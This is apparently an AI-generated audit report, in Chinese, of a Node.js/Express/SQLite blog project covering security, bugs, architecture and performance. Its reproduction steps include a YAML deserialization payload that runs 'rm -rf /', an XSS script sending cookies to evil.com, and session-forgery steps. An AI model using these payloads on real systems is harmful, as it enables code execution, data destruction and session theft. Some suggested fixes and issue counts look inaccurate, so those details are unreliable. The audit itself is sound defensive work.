# FTS-BLOG 项目全面审计报告

**日期**: 2026-08-21
**项目**: fts-blog (Frontend Test Suite - Blog)
**技术栈**: Node.js + Express + SQLite (sql.js) + EJS
**审计模式**: Ultracode xhigh — 多维度并行深度分析

---

## 执行摘要

| 严重级别 | 数量 | 说明 |
|----------|------|------|
| CRITICAL | 9 | 可远程利用，需立即修复 |
| HIGH | 14 | 严重安全/稳定风险，尽快修复 |
| MEDIUM | 15 | 架构/质量/中间风险 |
| LOW | 8 | 技术债务、维护问题 |

### 最大延迟源（性能）

1. **每请求全量 DB 反序列化**: `initSqlJs()` + `fs.readFileSync(DB_PATH)` + `new SQL.Database(buffer)` 每个 HTTP 请求执行一次
2. **每写操作全量 DB 序列化**: `db.export()` + `Buffer.from()` + `fs.writeFileSync` 每个写操作执行一次
3. **零缓存**: `marked.parse()` 每次都重新渲染 Markdown

### 最紧急的三个修复（按优先级）

1. **[RCE]** `yaml.load()` 无 schema 限制 → 任意代码执行 (`routes/import.js:274`)
2. **[XSS]** `marked` 无 sanitizer + `<%- %>` 输出 → Stored XSS (`server.js:114`, `views/post.ejs:33`)
3. **[会话劫持]** 硬编码 session secret + 无 httpOnly/sameSite (`server.js:121-124`)

---

## 一、CRITICAL 级问题

### 1. 不安全的 YAML 反序列化 → 远程代码执行 (RCE)

- **文件**: `routes/import.js:274`
- **代码**: `yaml.load(frontmatterText)` — 使用 js-yaml 默认 full schema
- **风险**: 支持 `!!js/function`, `!!python/object`, `!!js/undefined` 等标签，攻击者可通过恶意 frontmatter 在服务器上执行任意 JavaScript 代码
- **复现**: 上传包含 `---\ntitle: test\n__proto__: !!js/function 'function(){require("child_process").exec("rm -rf /")}' \n---` 的 .md 文件
- **修复**:
  ```js
  // 改用安全 schema
  frontmatter = yaml.load(frontmatterText, { schema: yaml.SAFE_SCHEMA }) || {};
  ```

### 2. Stored XSS via 未清理的 marked HTML 输出

- **文件**: `server.js:114-116`, `views/post.ejs:33`, `views/admin-preview.ejs:43`, `public/js/main.js:9`
- **代码**:
  ```js
  // server.js — marked 无 sanitizer
  marked.use({ gfm: true });
  // post.ejs — 未转义输出
  <%- marked.parse(post.content) %>
  ```
- **风险**: `marked` v4+ 默认不剥离 HTML。攻击者可在文章内容中注入 `<script>alert(1)</script>` 或 `<img src=x onerror=...>`，所有访问者浏览器执行
- **复现**: 创建文章，内容为 `<script>document.location='https://evil.com?c='+document.cookie</script>`，访问文章页面
- **修复**:
  ```js
  // 方案 1：使用 DOMPurify
  const createDOMPurify = require('dompurify');
  const { JSDOM } = require('jsdom');
  const window = new JSDOM().window;
  const DOMPurify = createDOMPurify(window);
  marked.use({ gfm: true });
  // 渲染时 sanitize
  const clean = DOMPurify.sanitize(marked.parse(content));
  // 方案 2：配置 marked 的 sanitize（如果版本支持）
  ```

### 3. 硬编码 Session Secret → 会话伪造

- **文件**: `server.js:121`
- **代码**: `secret: 'fts-blog-secret-key-2026'`
- **风险**: 任何能查看源码的人都可以用此密钥伪造签名 session cookie，直接 impersonate admin
- **复现**: 用 `fts-blog-secret-key-2026` 作为 secret 对 `{"userId":1,"username":"admin"}` 签名，发送为 cookie
- **修复**:
  ```js
  const sessionSecret = process.env.SESSION_SECRET ||
    require('crypto').randomBytes(64).toString('hex');
  ```

### 4. 不安全的 Cookie 设置

- **文件**: `server.js:124`
- **代码**: `cookie: { secure: false }` — 缺少 httpOnly, sameSite, maxAge
- **风险**:
  - `secure: false` → cookie 通过明文 HTTP 发送
  - 无 `httpOnly` → JavaScript 可读取 cookie（XSS 后 session 被盗）
  - 无 `sameSite` → CSRF 攻击更容易
  - 无 `maxAge` → cookie 永不过期
- **修复**:
  ```js
  cookie: {
    secure: process.env.NODE_ENV === 'production',
    httpOnly: true,
    sameSite: 'lax',
    maxAge: 24 * 60 * 60 * 1000 // 24 hours
  }
  ```

### 5. 硬编码凭证暴露

- **文件**: `README.md`, `server.js:160-161`, `database/init.js:64-66`
- **风险**: admin/admin123 在 README、启动横幅、init.js 日志中全部明文出现
- **修复**: 从 README 删除；启动时检查是否首次运行，提示设置密码

### 6. 路径遍历漏洞 (OBSIDIAN_DIR)

- **文件**: `routes/import.js:13, 67-69`
- **代码**: `fs.readdirSync(OBSIDIAN_DIR)` + `fs.readFileSync(filePath)` — 未验证文件名
- **风险**: 如果攻击者能在 `经验/` 目录放置文件名含 `../` 的文件（或利用符号链接），可以读取系统任意文件
- **修复**:
  ```js
  const sanitized = path.basename(filename);
  if (sanitized !== filename) throw new Error('Invalid filename');
  const filePath = path.join(OBSIDIAN_DIR, sanitized);
  if (!filePath.startsWith(OBSIDIAN_DIR)) throw new Error('Path traversal detected');
  ```

### 7. 并发写入导致的数据静默丢失

- **文件**: `routes/api.js:54-58`, `routes/import.js:31-35`, `routes/admin.js:54-58`
- **机制**: 每个请求执行 `readFileSync → new SQL.Database(buffer) → modify → export → writeFileSync`。两个并发请求时，B 读取旧文件 → 修改 → 写入，然后 A 的写入覆盖 B 的更改
- **复现**: `curl -X POST /api/posts -d '{"title":"A","slug":"a","content":"x"}' & curl -X POST /api/posts -d '{"title":"B","slug":"b","content":"y"}' &` — 一个 post 静默丢失
- **修复**: 使用文件锁 (`proper-lockfile`) 包装 `saveDb()`，或迁移到 PostgreSQL/MySQL

### 8. UTF-8 BOM 导致 frontmatter 静默丢失

- **文件**: `routes/import.js:252`
- **代码**: `if (lines[0].trim() !== '---')` — BOM (`﻿`) 导致 `lines[0].trim()` 返回 `'﻿---'`
- **风险**: Obsidian 文件带 BOM 时，所有 frontmatter 字段（标题、日期、标签）被当作普通 markdown 内容
- **修复**: `if (!lines[0].trim().startsWith('---'))` 或先 strip BOM

### 9. CSRF 完全缺失

- **文件**: 所有路由
- **风险**: 任意网站可通过隐藏表单/`fetch` 利用已登录用户的 cookie 执行操作（发帖、删除、上传）
- **修复**: 使用 `csurf` 中间件 + `sameSite: 'lax'` cookie

---

## 二、HIGH 级问题

### 10. PUT/DELETE 对不存在 ID 返回成功

- **文件**: `routes/api.js:294-360`
- **问题**: `UPDATE`/`DELETE` 影响 0 行时仍返回 `{ message: 'Post updated/deleted' }` + 200
- **修复**: 检查 `db.getRowsModified()` 或先 SELECT 确认存在

### 11. GROUP_CONCAT 1000 字符截断标签

- **文件**: `routes/api.js:117`, `routes/public.js:25`
- **问题**: SQLite `GROUP_CONCAT` 默认上限 1000 字符，文章标签多时被截断
- **修复**: `SELECT GROUP_CONCAT(t.name, ',') WITHIN GROUP (ORDER BY ...)` 或应用层聚合

### 12. Wiki-Link Slug 与文章 URL Slug 不一致

- **文件**: `routes/import.js:352` vs `:99-102`
- **问题**: wiki link `[[My Post]]` 生成 slug `my-post`，但实际文章 URL 从文件名生成。如果链接指向文件名不同的笔记，产生 404
- **修复**: 导入时建立 `wiki_title → slug` 的映射表

### 13. `decodeHtmlEntities` 损坏预览内容

- **文件**: `routes/admin.js:22-31, 210`
- **问题**: 预览时对内容做 HTML 解码（`&amp;` → `&`），导致代码示例中的 `&amp;` 等被篡改
- **修复**: 移除 decodeHtmlEntities 调用

### 14. 管理后台 XSS（onclick 属性注入）

- **文件**: `views/admin-dashboard.ejs:68,78`
- **代码**: `onclick="deletePost(<%= post.id %>, '<%= post.title %>')"`
- **风险**: `<%= %>` 是 HTML 转义，但在 JS 字符串上下文中无效。`post.title` 含 `'` 即可注入
- **修复**:
  ```ejs
  <button onclick="deletePost(<%= post.id %>, <%- JSON.stringify(post.title) %>)">
  ```

### 15. 首页 XSS（ondblclick 属性注入）

- **文件**: `views/index.ejs:41`
- **代码**: `ondblclick="window.location.href='/post/<%= post.slug %>'"`
- **风险**: HTML 转义在 JS 属性上下文中不完整
- **修复**: 使用 `addEventListener` + `data-slug` 属性

### 16. 导入目录部分失败导致数据不一致

- **文件**: `routes/import.js:85-144`
- **问题**: 批量导入中如果某个文件失败，前面已成功的记录仍被保存到 DB，无原子性
- **修复**: 使用事务，或先验证全部文件再写入

### 17. `db.close()` 不在 finally 块中

- **文件**: 几乎所有路由 handler
- **问题**: 异常路径上 `db.close()` 不会被调用 → 连接泄漏
- **修复**: `try { ... } finally { db.close(); }`

### 18. 无请求体大小限制

- **文件**: `server.js:105-106`
- **风险**: 攻击者可发送 GB 级 JSON 耗尽内存
- **修复**: `app.use(express.json({ limit: '1mb' }))`

### 19. 无 Rate Limit 登录接口

- **文件**: `routes/api.js:63`, `routes/admin.js:56`
- **风险**: 暴力破解默认 admin123
- **修复**: 使用 `express-rate-limit`，登录接口 5 次/分钟

### 20. 会话固定攻击

- **文件**: `routes/api.js:86-88`, `routes/admin.js:94-96`
- **问题**: 登录成功后未调用 `req.session.regenerate()`
- **修复**: 登录成功后 `req.session.regenerate(() => { req.session.userId = userId; })`

### 21. 重复 slug 错误被吞掉

- **文件**: `routes/api.js:289`
- **问题**: `UNIQUE constraint failed` 被 catch 块吞掉，返回通用 "Server error"
- **修复**: 检查 SQLite 错误码，返回 "Slug already exists"

### 22. admin.js 中 `getDb()` 重复定义

- **文件**: `routes/admin.js:12-19` 和 `:33-41`
- **风险**: 第二个定义覆盖第一个，编辑其中一个会造成维护隐患
- **修复**: 删除其中一个

### 23. 管理后台表单字段 XSS 风险

- **文件**: `views/admin-editor.ejs:42-70`
- **问题**: `value="<%= post.title %>"` — 如果 `post.title` 含 `" onfocus=alert(1) autofocus` 可注入
- **修复**: `<%- escapeHtml(post.title || '') %>`

### 24. API-INFO 页面暴露硬编码凭证

- **文件**: `views/api-info.ejs:100-102`
- **风险**: 任何访客可看到 admin/admin123
- **修复**: 删除凭证展示，改为提示"请联系管理员"

---

## 三、MEDIUM 级问题

### 25. 代码重复：`getDb()` 定义 4 次

- **文件**: `routes/api.js:44`, `routes/admin.js:12+33`, `routes/import.js:21`, `routes/public.js:11`
- **影响**: 策略变更需同步 4 处

### 26. 代码重复：`saveDb()` 定义 2 次

- **文件**: `routes/api.js:54`, `routes/import.js:31`

### 27. 代码重复：登录逻辑 2 套

- **文件**: `routes/api.js:63-94`, `routes/admin.js:56-107`

### 28. 代码重复：标签关联逻辑 5 处

- **文件**: `server.js:71-81`, `routes/api.js:260-282,318-335`, `routes/import.js:123-135,208-224`

### 29. 代码重复：Seed 逻辑 3 处

- **文件**: `server.js:24-91`, `database/seed.js:8-183`, `database/init.js:64-66`

### 30. Slug 生成正则重复 6+ 处

- **文件**: `routes/import.js:99,186,352`, `routes/admin.js:178`, `routes/public.js`, `server.js:40`

### 31. 500 行 god route 文件

- **文件**: `routes/api.js` (412 行)
- **问题**: 认证、文章 CRUD、标签 CRUD、文件上传全部在一个文件
- **建议**: 拆分为 `routes/api/posts.js`, `routes/api/tags.js`, `routes/api/auth.js`, `routes/api/upload.js`

### 32. 无集中式错误处理

- **文件**: 所有路由
- **问题**: 每个 handler 自己 try/catch，返回格式不一致
- **建议**: `app.use((err, req, res, next) => { ... })`

### 33. 通用错误吞掉真实信息

- **文件**: `routes/api.js:92,158,198,289,358,374,393`
- **问题**: 全部 `res.status(500).json({ error: 'Server error' })`
- **影响**: 生产环境无法调试

### 34. 模块加载时自动执行副作用

- **文件**: `database/init.js:80-83`, `database/seed.js:185-188`
- **问题**: `require('./database/seed')` 立即执行 seedPosts()
- **建议**: 导出函数，主程序显式调用

### 35. 无日志框架

- **文件**: 全局
- **问题**: 只有 `console.log`，无级别、结构、请求 ID
- **建议**: Winston/Pino + Morgan

### 36. 无输入验证库

- **文件**: 全局
- **问题**: `if (!title)` 式验证
- **建议**: Zod/Joi

### 37. 无数据库迁移系统

- **文件**: `database/init.js`
- **建议**: 使用 `umzug` 或手动 migration 文件

### 38. 无健康检查端点

- **文件**: `server.js`
- **建议**: `GET /health` → `{ status: 'ok' }`

### 39. 无优雅停机

- **文件**: `server.js`
- **建议**: `process.on('SIGTERM', ...)` → 关闭 DB → 停止监听

### 40. 无测试

- **文件**: 项目范围
- **观察**: `test-frontmatter.js` 存在但无测试框架
- **建议**: Jest + 单元测试覆盖工具函数

### 41. 列索引用错位

- **文件**: `routes/api.js:128-140` 等
- **问题**: `row[0]` 到 `row[10]` 手动映射，schema 变更时静默出错
- **建议**: 使用 `row.toObject()` 或对象映射

### 42. `decodeHtmlEntities` 无文档说明

- **文件**: `routes/admin.js:22-31`
- **问题**: 只使用了一次，无注释说明为什么需要

---

## 四、LOW 级问题

### 43. CSS 重复选择器

- **文件**: `public/css/style.css`
- **问题**: `.tag` 定义两次 (393-405, 408-419)；`.card-footer` 定义两次 (371-380, 427-436)

### 44. 非标准媒体查询

- **文件**: `public/css/style.css:474`
- **代码**: `@Media` 大写 M（CSS 不区分大小写但不符合规范）

### 45. 冗余响应式规则

- **文件**: `public/css/style.css:878-894` 覆盖已在 483-490 定义的规则

### 46. HTTP 外链

- **文件**: `views/partials/footer.ejs`
- **代码**: `http://www.beian.gov.cn/`
- **修复**: HTTPS

### 47. API 文档暴露 localhost

- **文件**: `views/api-info.ejs:11`
- **修复**: 使用相对路径或配置化

### 48. 输入框焦点样式不完整

- **文件**: `public/css/style.css`
- **建议**: 添加 `outline` fallback 支持 `forced-colors`

### 49. 魔法数字

- **文件**: 多处
- **问题**: `5 * 1024 * 1024`, `200` (char/min), `1000` (group_concat)
- **建议**: 提取为命名常量

### 50. EJS 转义配置不明确

- **文件**: `server.js`
- **问题**: 未显式设置 `app.locals.escape = 'utf-8'` 或确认默认行为

---

## 五、性能问题

### P0. `initSqlJs()` WASM 引擎每请求重新初始化 + 全量 DB 反序列化

- **文件**: `routes/api.js:44-51`, `routes/public.js:11-18`, `routes/admin.js:12-18,34-40`, `routes/import.js:21-28`
- **机制**: `getDb()` 每次执行 `await initSqlJs()` + `fs.readFileSync(DB_PATH)` + `new SQL.Database(fileBuffer)`
- **影响**:
  - `initSqlJs()` 加载 `sql-wasm.wasm` (~400KB+)，编译并启动引擎（虽然有内部缓存，但每次 `require` + `await initSqlJs()` 仍有开销）
  - `fs.readFileSync(DB_PATH)` + `new SQL.Database(buffer)` 将**整个数据库文件反序列化到内存**——即使只是 `SELECT COUNT(*)`
  - 每请求增加 50-300ms 延迟（取决于 DB 大小）
  - 1MB 的 blog.db → 每次页面加载读写 ~1MB
- **数据**:
  ```
  getDb() 每次执行:
    1. require('sql.js') → 模块加载
    2. await initSqlJs() → WASM 初始化 (~50-200ms)
    3. fs.readFileSync(DB_PATH) → 读整个文件
    4. new SQL.Database(buffer) → 反序列化整个 DB
  ```
- **修复方向（最大单点收益）**:
  ```js
  // server.js — 启动时初始化一次
  let dbInstance;
  async function initDb() {
    const SQL = await initSqlJs();
    const fileBuffer = fs.existsSync(DB_PATH) ? fs.readFileSync(DB_PATH) : null;
    dbInstance = fileBuffer ? new SQL.Database(fileBuffer) : new SQL.Database();
  }
  // 写操作后: dbInstance = db; saveDbSync(dbInstance);
  ```

### P1. 全量 DB 导出/导入每次写操作

- **文件**: `routes/api.js:54-58`, `routes/import.js:31-35`
- **代码**:
  ```js
  function saveDb(db) {
    const data = db.export();           // 序列化整个 DB → ArrayBuffer
    const buffer = Buffer.from(data);   // 拷贝到 Node Buffer
    fs.writeFileSync(DB_PATH, buffer);  // 同步写入磁盘
  }
  ```
- **影响**: O(n) 复杂度，1000 篇文章 (~数 MB) 时单次 `PUT` 需数十毫秒；并发写入时序列化瓶颈
- **修复**:
  - 短期：文件锁包装 `saveDb()`（`proper-lockfile`）
  - 中期：启用 WAL 模式 `PRAGMA journal_mode = WAL;`
  - 长期：迁移到 PostgreSQL/MySQL

### P2. 无缓存层 + Markdown 每次重新渲染

- **文件**: `server.js:112-117`, `views/*.ejs`
- **问题**: `app.locals.marked` 配置一次，但 EJS 模板每次调用 `marked.parse(post.content)`。无任何缓存
- **影响**: 相同请求（首页刷新两次）完整执行：读 DB → 反序列化 → SQL → marked 渲染 → EJS → HTML
- **修复**:
  ```js
  // 文章列表缓存 5 分钟
  const cache = new Map();
  app.get('/', async (req, res) => {
    const cached = cache.get('home');
    if (cached && Date.now() - cached.time < 300000) {
      return res.render('index', cached.data);
    }
    // ... query db
    cache.set('home', { data: renderData, time: Date.now() });
  });
  ```

### P3. 无 HTTP 压缩和缓存头

- **文件**: `server.js:104-110`
- **问题**: 无 `compression()` 中间件；无 `Cache-Control`, `ETag`, `Last-Modified`
- **影响**: HTML 比 gzip 版本大 2-5 倍；浏览器每次都重新下载 CSS/JS
- **修复**:
  ```js
  app.use(require('compression')());
  app.use(express.static(path.join(__dirname, 'public'), {
    maxAge: '1y',
    etag: true
  }));
  ```

### P4. express-session MemoryStore + 硬编码 Secret

- **文件**: `server.js:120-125`
- **问题**: MemoryStore 不跨进程共享；PM2 cluster 模式会丢失 session
- **修复**: `connect-session-knex` / `connect-redis` + `process.env.SESSION_SECRET`

### P5. 图片上传无优化

- **文件**: `routes/api.js:19-41`
- **问题**: Multer 保存原始文件（最大 5MB），无压缩、无 WebP 转换、无 `srcset`
- **影响**: 单张 3MB 的头图在移动端阻塞 LCP 数秒
- **修复**: 使用 `sharp` 自动压缩 + WebP 转换

### P6. 启动时 DB 双次初始化

- **文件**: `database/init.js:80-83`（模块级调用）+ `server.js:94`（再次调用）
- **影响**: 冷启动时数据库被打开两次

### P7. 无资源指纹 / 缓存失效

- **文件**: `public/css/`, `public/js/`
- **问题**: CSS/JS 文件名无内容 hash，无法设置长期 `max-age`
- **修复**: 添加构建步骤（`esbuild`/`vite`）生成 `[name].[hash].js`

### P8. 单进程无 clustering

- **文件**: `server.js`
- **问题**: Node.js 默认单核；`restart_pm2.py` 存在但无 `pm2.config.js`
- **修复**: 添加 `pm2.config.js` cluster 模式或 `cluster` 模块

---

## 六、架构问题详表

| 问题 | 严重度 | 位置 | 建议 |
|------|--------|------|------|
| `getDb()` 重复 4 次 | HIGH | api, admin, import, public | 提取到 `database/connection.js` |
| `saveDb()` 重复 2 次 | MEDIUM | api, import | 同上 |
| 登录逻辑重复 2 套 | HIGH | api.js:63-94, admin.js:56-107 | 提取到 `services/auth.js` |
| 标签关联逻辑重复 5 处 | HIGH | 5 个文件 | 提取到 `services/tags.js` |
| Seed 逻辑 3 入口 | HIGH | server, init, seed | 统一为 CLI 命令 |
| 412 行 god route | HIGH | api.js | 拆分子路由 |
| 无服务层 | HIGH | 全局 | 添加 services/ 目录 |
| 无错误类 | MEDIUM | 全局 | `class AppError extends Error` |
| `decodeHtmlEntities` 无文档 | MEDIUM | admin.js:22 | 添加注释或移除 |
| `getDb` 死代码 | MEDIUM | admin.js:12-19 | 删除 |
| 列索引用错位 | MEDIUM | api.js:128-140 | 使用对象映射 |

---

## 七、模板层 XSS 风险汇总

| 模板 | 行号 | 变量 | 风险 | 说明 |
|------|------|------|------|------|
| `post.ejs` | 33 | `post.content` | **HIGH** | `<%- marked.parse() %>` 未清理 |
| `admin-preview.ejs` | 43 | `post.content` | **HIGH** | 同上 |
| `admin-dashboard.ejs` | 68,78 | `post.title` | **HIGH** | onclick 中 JS 字符串注入 |
| `index.ejs` | 41 | `post.slug` | **MEDIUM** | ondblclick 中属性注入 |
| `admin-editor.ejs` | 42-70 | `post.*` | **MEDIUM** | 表单属性值注入 |
| `admin-import.ejs` | 317,323,381 | `f.title/slug/filename/error` | **HIGH** | innerHTML 注入 |
| `main.js` | 9 | markdown | **HIGH** | `innerHTML` 未 sanitize |

---

## 八、正面观察

1. ✅ 所有 SQL 查询使用参数化 `?` 占位符，无 SQL 注入
2. ✅ bcrypt 哈希密码（cost factor 10）
3. ✅ EJS 默认 `<%= %>` HTML 转义（大部分模板正确使用）
4. ✅ 蓝图美学设计独特且一致
5. ✅ Obsidian 导入功能考虑周全（frontmatter、wiki link、callout、标签）
6. ✅ 标签多对多关系设计合理
7. ✅ REST API 遵循基本规范
8. ✅ 文件上传有大小限制 (5MB) 和类型检查

---

## 九、修复优先级路线图

### P0 — 立即修复（本周）

| # | 问题 | 预估工时 |
|---|------|----------|
| 1 | YAML `yaml.load()` → `yaml.load(text, { schema: yaml.SAFE_SCHEMA })` | 5 分钟 |
| 2 | `marked` + DOMPurify 消除 XSS | 30 分钟 |
| 3 | Session secret 改为环境变量 | 5 分钟 |
| 4 | Cookie 添加 httpOnly/sameSite/secure/maxAge | 5 分钟 |
| 5 | 硬编码凭证从 README/横幅移除 | 15 分钟 |
| 6 | OBSIDIAN_DIR 路径遍历修复 | 15 分钟 |
| 7 | saveDb() 加文件锁 | 30 分钟 |

### P1 — 尽快修复（本月）

| # | 问题 | 预估工时 |
|---|------|----------|
| 8 | CSRF 保护 (csurf 中间件) | 30 分钟 |
| 9 | Rate Limit 登录接口 | 15 分钟 |
| 10 | 会话 ID  regenerate | 15 分钟 |
| 11 | PUT/DELETE 返回 404 当资源不存在 | 20 分钟 |
| 12 | GROUP_CONCAT 上限修复 | 20 分钟 |
| 13 | BOM 处理修复 | 10 分钟 |
| 14 | decodeHtmlEntities 修复/移除 | 10 分钟 |
| 15 | 模板层 XSS 修复 (onclick/ondblclick) | 30 分钟 |
| 16 | db.close() → finally 块 | 30 分钟 |
| 17 | 请求体大小限制 | 5 分钟 |

### P2 — 近期重构（下个迭代）

| # | 问题 | 预估工时 |
|---|------|----------|
| 18 | 提取 `getDb/saveDb` 到 `database/connection.js` | 1 小时 |
| 19 | 提取标签关联逻辑到 `services/tags.js` | 1 小时 |
| 20 | 拆分 api.js god route | 2 小时 |
| 21 | 集中式错误处理中间件 | 1 小时 |
| 22 | 添加 Winston/Pino 日志 | 1 小时 |
| 23 | 添加 Zod 输入验证 | 2 小时 |

### P3 — 长期优化

| # | 问题 | 预估工时 |
|---|------|----------|
| 24 | 添加 Redis/内存缓存 | 3 小时 |
| 25 | 迁移到 PostgreSQL | 1-2 天 |
| 26 | 添加压缩中间件 | 15 分钟 |
| 27 | 图片优化 (sharp) | 1 小时 |
| 28 | 添加健康检查 + 优雅停机 | 1 小时 |
| 29 | 添加测试套件 (Jest) | 1 天 |
| 30 | 添加数据库迁移系统 | 3 小时 |

---

## 十、技术债务总结

```
代码重复指标:
  getDb()         ████████████████████  4 处
  saveDb()        ██████                2 处
  登录逻辑        ████████████████████  2 处（完全复制）
  标签关联        ████████████████████████████████████████  5 处
  Slug 正则       ██████████████████████████████████████████████  6+ 处
  Seed 逻辑       ████████████████████  3 入口

安全状态:
  CRITICAL ████████████████████░░░░░░░░  9
  HIGH     ████████████████████████████  14
  MEDIUM   ██████████████████████████████  15
  LOW      ████████░░░░░░░░░░░░░░░░░░░░  8

性能瓶颈:
  数据库全量读写  ████████████████████  CRITICAL (P0)
  WASM 每请求初始化 ████████████████████  HIGH (P0)
  无缓存          ██████████████████    HIGH
  无压缩/优化     ████████              MEDIUM
  单进程          ██████                MEDIUM
```

---

*报告生成: Claude Code Workflow — Explore → Security → Architecture → Bugs → Performance → Synthesize*
